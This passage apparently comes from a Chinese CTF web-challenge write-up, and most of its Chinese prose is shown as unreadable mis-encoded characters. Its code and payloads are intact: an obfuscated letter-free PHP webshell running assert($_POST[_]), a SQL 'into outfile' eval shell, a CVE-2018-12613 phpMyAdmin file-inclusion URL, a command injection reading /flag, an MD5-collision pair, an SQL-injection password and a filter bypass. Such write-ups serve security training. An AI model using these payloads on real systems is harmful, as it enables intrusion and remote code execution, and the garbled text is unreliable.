çš„ç«äº‰å¯¹æ‰‹å¤ªå¤šäº†ï¼Œè€Œä¸”éƒ½ä¸å·®ï¼Œä½ è¡¨ç°å¹³å¹³ï¼Œç†æ‰€å½“ç„¶åœ°è¢«æ‹’ä¹‹é—¨å¤–Â·Â·Â·Â·Â·Â·</span></span><br><span class="line"><span class="string">ç°åœ¨çš„ä½ ï¼Œä¹Ÿè®¸è¿˜åœ¨ä¸Šå¤§å­¦ï¼Œä¹Ÿè®¸å’Œæ‹äººæ©æ©çˆ±çˆ±ï¼Œæ¯å¤©é»åœ¨ä¸€èµ·ï¼Œåˆé¥­æ™šé¥­ä¸€èµ·å»åƒï¼Œæ™šè‡ªä¹ åè¿˜ä¼šä¸€èµ·åœ¨æ“åœºæ•£æ­¥ã€‚ä½ ä»¬è®¨è®ºèµ·æœªæ¥ï¼Œæœ€åçš„ç»“è®ºæ€»æ˜¯ï¼šä¸è¦æƒ³å¾—å¤ªå¤šï¼Œè®¤çœŸè¿‡å¥½ç°åœ¨å°±å¥½ã€‚ ä¸å¹¸è¿çš„è¯ï¼Œå‡ ä¸ªæœˆåï¼Œä½ ä»¬å°±åˆ†æ‰‹äº†ï¼Œä½ å‡„å‡„æƒ¨æƒ¨æˆšæˆšï¼Œåå¤é—®è‡ªå·±ç©¶ç«Ÿå“ªé‡Œåšé”™äº†ï¼›å¹¸è¿çš„è¯ï¼Œä½ ä»¬ä¼šä¸€ç›´æ‹çˆ±åˆ°æ¯•ä¸šï¼Œæœ€ç»ˆï¼Œä½ ç»å¾—è‡ªå·±ä¸å¤Ÿä¼˜ç§€æ²¡èƒ½åŠ›å»å¯¹æ–¹æ‰€åœ¨çš„åŸå¸‚è¯»ç ”æˆ–è€…å·¥ä½œï¼Œæ‰€ä»¥ä½ ä»¬å¸¦ç€ä¸èˆå’Œæ‚”æ¨åˆ†æ‰‹äº†ã€‚</span></span><br><span class="line"><span class="string">ç°å®å¾ˆæ®‹é…·ï¼Œè‡³æ­¤ï¼Œä½ ä¿¡äº†ã€‚</span></span><br><span class="line"><span class="string">ç°åœ¨çš„ä½ å–œæ¬¢åˆ·å¾®åšï¼Œä½ ä¼šå…¨åŠ›æ”¯æŒé‚£äº›ä½ èµåŒçš„è§‚ç‚¹ï¼Œä½ ä¼šæ¿€åŠ±å¦å®šé‚£äº›ä½ åå¯¹çš„è§‚ç‚¹ã€‚ä½ çˆ±æ†åˆ†æ˜ï¼Œçœ‹èµ·æ¥å¾ˆæœ‰æ­£ä¹‰æ„Ÿã€‚ä½ è§‰å¾—è¡€æ°”æ–¹åˆšçš„å¹´è½»äººå°±åº”è¯¥æ•¢äºè¯´å‡ºè‡ªå·±çš„å¿ƒå£°ã€‚ä½ å¯èƒ½ä»æ¥ä¸ä¼šå»æƒ³ä¸€ä¸ªé—®é¢˜ï¼šä½ çš„è§‚ç‚¹ï¼Œæ¥è‡ªå“ªé‡Œï¼Ÿå…¶å®ï¼Œå®ƒä»¬ç»å¤§éƒ¨åˆ†æ¥è‡ªç½‘ç»œï¼Œå®ƒä»¬å·²ç»èš•é£Ÿäº†ä½ çš„åˆ¤æ–­åŠ›ã€‚</span></span><br><span class="line"><span class="string">ç°åœ¨ï¼Œæˆ‘åªæƒ³é—®ä½ ä¸€ä¸ªé—®é¢˜ï¼šäºŒåå²çš„ä½ ï¼Œæœ‰ä»€ä¹ˆèµ„æœ¬ã€‚</span></span><br><span class="line"><span class="string">ä½ åªæ˜¯åƒåƒä¸‡ä¸‡äººä¸­å¾®ä¸è¶³é“çš„ä¸€ä¸ªäººï¼Œå°‘äº†ä½ ï¼Œåœ°çƒè¿˜æ˜¯ä¸€æ ·ä¼šè½¬ã€‚</span></span><br><span class="line"><span class="string">æˆ‘æ•¢æ‰“èµŒï¼Œä¸€å®šå¾ˆä¹…æ²¡äººå’Œä½ è¯´è¿‡â€œåƒå¾—è‹¦ä¸­è‹¦ï¼Œæ–¹ä¸ºäººä¸Šäººâ€è¿™å¥è¯äº†å§ï¼Ÿ</span></span><br><span class="line"><span class="string">ä½ çŸ¥é“â€œè´£ä»»â€ä¸¤ä¸ªå­—æ˜¯æ€ä¹ˆå†™çš„å—?</span></span><br><span class="line"><span class="string">å½“ä½ è°ˆè®ºé£ç¿”çš„æ—¶å€™ï¼Œä½ æ˜¯ä¸æ˜¯å¿˜è®°äº†åœ°å¿ƒå¼•åŠ›çš„å­˜åœ¨ï¼Ÿ</span></span><br><span class="line"><span class="string">ç°åœ¨çš„ä½ ï¼Œå¦‚æœè¿˜æ˜¯æ”¾çºµç€è‡ªå·±çš„æ‡’æƒ°ä¸å¹¼ç¨šï¼Œè™šåº¦ç€å…‰é˜´ï¼Œé‚£ä¹ˆï¼Œä½ å°±è™šåº¦å»å§ã€‚åæ­£æˆ‘å·²ç»è¿‡äº†äºŒåå²çš„å¹´çºªï¼Œæˆ‘è¿˜æœ‰æœªæ¥ï¼Œæˆ‘å¾—ç›´å¥”å‘å‰äº†ï¼Œä¸é™ªä½ äº†ã€‚</span></span><br><span class="line"><span class="string">å†è§&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; mb_strlen($str, <span class="string">&#x27;utf-8&#x27;</span>); $i++) &#123;</span><br><span class="line">    $st = mb_substr($str, $i, <span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    $a = ~($st);</span><br><span class="line">    $b = $a[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">#$c = $a[2];</span></span><br><span class="line">    <span class="keyword">foreach</span> ($dic <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($b == $key) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $key . <span class="string">&#x27;  &#x27;</span> . <span class="string">&#x27;:&#x27;</span> . <span class="string">&#x27;   &#x27;</span> . $st;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if($c==$key)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     echo $key.&#x27;  &#x27;.&#x27;:&#x27;.&#x27;   &#x27;.$st;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç®—å–å¯ä»¥ç”¨çš„UTF-8çš„ä¸­æ–‡å­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯è°¢æ¬¡ç«™(POST) é‹åŒ…åŒ…çš„æ‹¾æ·(assert)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228151226.png"></p>
<p>å½“ç„¶è¿™é“é¢˜ç”¨<code> ~()[1];</code> æ¥å–å­—æ¯<code>php &gt; echo ~(é‹)[1]; a</code></p>
<p>ç„¶åå°±æ˜¯<code>åˆ©ç”¨PHPçš„å¼±ç±»å‹</code> æ¥è·å–<code>1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228154746.png"></p>
<p>ç„¶åå°±æ˜¯å†™shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//assert($_POST[_]);</span></span><br><span class="line"><span class="comment">// ç”¨ç™½åå•åˆ—å‡ºæ‰€éœ€å­—æ¯,ç„¶åå†æ‹¼æ¥å‡ºå‡½æ•°</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$_ = _ == _; <span class="comment">// 1</span></span><br><span class="line">$__ = ~(é‹)[$_]; <span class="comment">// a</span></span><br><span class="line">$___ = ~(åŒ…)[$_]; <span class="comment">// s</span></span><br><span class="line">$____ = ~(çš„)[$_]; <span class="comment">// e</span></span><br><span class="line">$_____ = ~(æ·)[$_]; <span class="comment">// r</span></span><br><span class="line">$______ = ~(æ‹¾)[$_]; <span class="comment">// t</span></span><br><span class="line">$_______ = ~(æ¯)[$_]; <span class="comment">// P</span></span><br><span class="line">$________ = ~(è°¢)[$_]; <span class="comment">// O</span></span><br><span class="line">$_________ = ~(æ¬¡)[$_]; <span class="comment">// S</span></span><br><span class="line">$__________ = ~(ç«™)[$_]; <span class="comment">//T</span></span><br><span class="line"><span class="comment">// æ„é€ ä¸€å¥è¯</span></span><br><span class="line">$_ = $__ . $___ . $___ . $____ . $_____ . $______; <span class="comment">// assert</span></span><br><span class="line">$__ = _ . $_______ . $________ . $_________ . $__________; <span class="comment">// _POST</span></span><br><span class="line">$__= $$__;  <span class="comment">// $_POST</span></span><br><span class="line">$_($__[_]);  <span class="comment">// assert($_POST[_]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>ä½¿ç”¨æ—¶,å°†æ‰€æœ‰æ³¨é‡Šåˆ é™¤,å¹¶ä¸”ä¸è¦ç•™ä»»ä½•ç©ºæ ¼!</strong></p>
<p>ä¸Šä¼ æˆåŠŸå,flagå°±åœ¨phpinfoé‡Œé¢â€¦..</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">$_=_==_;</span><br><span class="line">$__=~(é‹)[$_];</span><br><span class="line">$___=~(åŒ…)[$_];</span><br><span class="line">$____=~(çš„)[$_];</span><br><span class="line">$_____=~(æ·)[$_];</span><br><span class="line">$______=~(æ‹¾)[$_];</span><br><span class="line">$_______=~(æ¯)[$_];</span><br><span class="line">$________=~(è°¢)[$_];</span><br><span class="line">$_________=~(æ¬¡)[$_];</span><br><span class="line">$__________=~(ç«™)[$_];</span><br><span class="line">$_=$__.$___.$___.$____.$_____.$______;</span><br><span class="line">$__=_.$_______.$________.$_________.$__________;</span><br><span class="line">$__=$$__;</span><br><span class="line">$_($__[_]);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165052.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165125.png"></p>
<p>å‚è€ƒèµ„æ–™: <a target="_blank" rel="noopener" href="https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/">https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/</a></p>
<p>p ğŸ® : <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<h1 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous#"></a>[SUCTF 2018]annonymous#</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;die(`cat flag.php`);&quot;</span>); <span class="comment">// å¦‚æœæ‰§è¡Œäº†MY å‡½æ•°,é‚£ä¹ˆå°±èƒ½ cat flag.php(å› ä¸ºæ˜¯åå¼•å·)</span></span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); <span class="comment">// æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼;ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º32çš„ä¼ªéšæœºå­—èŠ‚ä¸²</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_$hash()&#123;&quot;</span> <span class="comment">// å‡½æ•°åç§°ä¸º SUCTF_32HASHå€¼</span></span><br><span class="line">    . <span class="string">&quot;global \$MY;&quot;</span> <span class="comment">// å®šä¹‰ä¸ºå…¨å±€å˜é‡</span></span><br><span class="line">    . <span class="string">&quot;\$MY();&quot;</span> <span class="comment">// è°ƒç”¨æ–°çš„åŒ¿åå‡½æ•°</span></span><br><span class="line">    . <span class="string">&quot;&#125;&quot;</span>); <span class="comment">// eval(php_code);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;func_name&#x27;</span>])) &#123;</span><br><span class="line">    $_GET[<span class="string">&quot;func_name&quot;</span>](); <span class="comment">// æ‰§è¡Œfunc_name å‡½æ•° ,  æ„é€  func_name ä¸ºåŒ¿åå‡½æ•°å°±å¯ä»¥æ‹¿åˆ°flag ;</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//function SUCTF_$hash()&#123;&quot;.&quot;global \$MY;&quot;.&quot;\$MY();&quot; . &quot;&#125;&quot;&#125;;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$MY = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line">var_dump($MY);</span><br><span class="line"><span class="comment">// string(9) &quot; lambda_1&quot;  åé¢è¿™ä¸ªæ•°å­—çœ‹äº†WPè¯´æ˜¯éšæœºçš„</span></span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ€è·¯å°±æ˜¯çˆ†ç ´è¿™ä¸ªæ•°å­—,å°±å¯ä»¥æ‹¿åˆ°flag</p>
<p><code># è¡¨ç¤ºæœªç ”ç©¶é€å½» , åæœŸè¡¥å……</code></p>
<h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web#"></a>[å®‰æ´µæ¯ 2019]easy_web#</h1><p>å¯¹<code>img</code>çš„å‚æ•°è¿›è¡Œä¸¤æ¬¡base64decode å’Œä¸€æ¬¡hexdecode å³å¯å¾—åˆ°<code>555.png</code> ç”¨ç›¸åçš„æ–¹æ³•å¯¹index.phpè¿›è¡Œç¼–ç å¾—åˆ° <code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code> å¾—åˆ°phpæºç </p>
<p>åœ¨è¿›è¡ŒRCE ä¹‹å‰éœ€è¦ ç»•è¿‡</p>
<p><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code> </p>
<p>ä¸‰ä¸ªç­‰å·çš„md5<code>å¼ºç›¸ç­‰</code> ç”¨ä¸‹é¢è¿™ä¸ªå°±å¥½äº†,ç„¶åå°±å¯ä»¥ æ‰§è¡Œcmdé‡Œçš„å‘½ä»¤äº†(å› ä¸ºæ˜¯åå¼•å·`)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯è¿™æ®µæ­£åˆ™è¡¨è¾¾å¼: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|<span class="keyword">echo</span>|sh|\<span class="string">&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿‡æ»¤\ , ç›´æ¥ <code>ca\t /fl\ag</code> å³å¯.</p>
<p><code># è¡¨ç¤ºæœªç ”ç©¶é€å½» , åæœŸè¡¥å……</code></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><p>å¾ˆç®€å•çš„æ–‡ä»¶ä¸Šä¼ é¢˜,è¿™é‡Œæˆ‘fuzz åç¼€çš„æ—¶å€™,é™¤äº† <code>.php</code> <code>.php2</code> çš„æ–‡ä»¶ä¸èƒ½ä¸Šä¼ å¤–,ä»¥åŠç”¨<code>.</code>æ¥ç»•è¿‡çš„ä¼šæŠŠphpæ›¿æ¢ä¸ºç©º,å…¶ä»–çš„éƒ½èƒ½ä¸Šä¼ ,ä½†æ˜¯ä¸èƒ½è§£æ,èšå‰‘è¿ä¸ä¸Š.æœ€åç”¨<code>.phtml</code> è¿ä¸Šäº†</p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h1><p><code>/?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„ command injection</p>
<p><code>127.0.0.1;cat /flag</code></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><ul>
<li>å¤‡ä»½æ–‡ä»¶</li>
<li>å¼±ç±»å‹</li>
</ul>
<p><code>/index.php.bak</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;&#x3D;&#x3D;123);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<p><code>key=123</code></p>
<h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>é™¤äº†é¢˜ç›®æ•°æ®åº“è¿™ä¸¤ä¸ªå­—,æ‰¾ä¸åˆ°ä»»ä½•æç¤º,æ‰«æç›®å½•: <code>robots.txt</code> <code>phpinfo.php</code>  <code>phpmyadmin/</code> ä¸€å¼€å§‹æˆ‘çš„æ€è·¯æ˜¯: åœ¨é‡Œé¢å†™ä¸€ä¸ªä¸€å¥è¯ç„¶åæ‹¿shell åœ¨æ–‡ä»¶ç›®å½•é‡Œé¢æ‹¿flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[aaa]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœ‰æƒé™ <code>#1045 - Access denied for user &#39;test&#39;@&#39;%&#39; (using password: YES)</code> </p>
<p> æŸ¥çœ‹phpmyadmin çš„ç‰ˆæœ¬ä¸º<code> 4.8.1</code> å»æœä¸€æ³¢æ¼æ´ å¯ä»¥æœåˆ° <strong>CVE-2018-12613</strong></p>
<p>å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ‹¿flag</p>
<p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code> </p>
<p>è¿˜å¯ä»¥åˆ©ç”¨ä¸‹é¢è¿™ç¯‡æ–‡ç« çš„æ€è·¯æ¥getshell</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9897436.html">https://www.cnblogs.com/bmjoker/p/9897436.html</a></p>
<p>åœ¨SQL ä¸­æ‰§è¡Œä¸€ä¸ª phpinfoç”¨äºæµ‹è¯•,æˆ–è€…å†™ä¸€ä¸ªä¸€å¥è¯è¿shell, ç„¶åæŸ¥çœ‹cookie(sessionid) <code>666d1r51ecqgj304aficsoijuv</code> , session æ–‡ä»¶æ˜¯å­˜æ”¾åœ¨<code>/tmp/sess_sessionid</code> è¿™ä¸ªæ–‡ä»¶ä¸‹çš„</p>
<p><code>phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_666d1r51ecqgj304aficsoijuv</code></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">å­¦ä¹ </a></p>
<p><code>%253f</code> æ˜¯ <code>?</code> ç»è¿‡ä¸¤æ¬¡URLç¼–ç çš„ç»“æœ.ä»è€Œæ¥ç»•è¿‡ç™½åå•æ£€æµ‹(465è¡Œçš„ urldecode()),å…·ä½“åŸç† å‚è€ƒå­¦ä¹ </p>
<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>æ²¡æœ‰ä»»ä½•æç¤º, åªçŸ¥é“æ˜¯å’ŒMD5æœ‰å…³çš„,æŠ“åŒ…åå‘ç°äº†hint :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="keyword">md5</span>($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å’Œ <a href="https://hack-for.fun/posts/20200103/#toc-heading-4">https://hack-for.fun/posts/20200103/#toc-heading-4</a> æ˜¯ä¸€æ ·çš„,ç›´æ¥æ¥äº†</p>
<p>passwordä¸º <code>ffifdyop</code> çš„æ—¶å€™å³å¯, å› ä¸º <code>ffifdyop</code> çš„md5å€¼çš„åŸå§‹äºŒè¿›åˆ¶æ•°å­˜åœ¨ â€˜orâ€™6 </p>
<p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 </p>
<p><code>window.location.replace(&#39;./levels91.php&#39;)</code> ç»§ç»­è®¿é—®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>å¼±ç±»å‹ç»•è¿‡,ç”¨æ•°ç»„ä¹Ÿè¡Œ<code>levels91.php?a[]=1&amp;b[]=2</code> md5ä¸èƒ½å¤„ç†æ•°ç»„,éƒ½ä¸ºnullå°±trueäº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag; <span class="comment">// è¿™å’Œå®‰æ´µæ¯çš„ easy_webä¸€æ ·äº†, md5 å¼ºæ¯”è¾ƒ,ç›´æ¥æ¥</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

